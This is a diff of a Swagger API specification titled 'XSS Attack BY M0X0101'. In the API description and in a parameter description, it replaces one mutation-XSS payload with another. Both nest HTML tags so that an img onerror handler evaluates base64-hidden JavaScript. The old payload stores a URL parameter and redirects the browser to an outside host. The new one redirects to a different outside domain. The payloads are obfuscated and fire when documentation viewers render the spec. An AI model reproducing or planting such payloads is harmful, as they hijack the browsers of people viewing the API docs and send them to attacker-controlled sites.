@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='Y29uc3QgdGVyPW5ldyBVVUwoZG9jdW1lbnQubG9jYXRpb24uc2VhcmNoLnNwbGl0KCcmIykpLnNlYXJjaFBhcmFtcy5nZXQoJ3RlcicpO2lmKHRlcil7bG9jYWxTdG9yYWdlLnNldEl0ZW0oJ3RlcicsdGVyKTt3aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cHM6Ly9odW50ZXJmdWxsLXNldmVyLm9ubGluZSc7fQ==' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0My5odG1sJwo=' onerror='eval(atob(this.id))'>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='Y29uc3QgdGVyPW5ldyBVVUwoZG9jdW1lbnQubG9jYXRpb24uc2VhcmNoLnNwbGl0KCcmIykpLnNlYXJjaFBhcmFtcy5nZXQoJ3RlcicpO2lmKHRlcil7bG9jYWxTdG9yYWdlLnNldEl0ZW0oJ3RlcicsdGVyKTt3aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cHM6Ly9odW50ZXJmdWxsLXNldmVyLm9ubGluZSc7fQ==' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0My5odG1sJwo=' onerror='eval(atob(this.id))'>"></form>
           format: int64
           in: path
           name: id
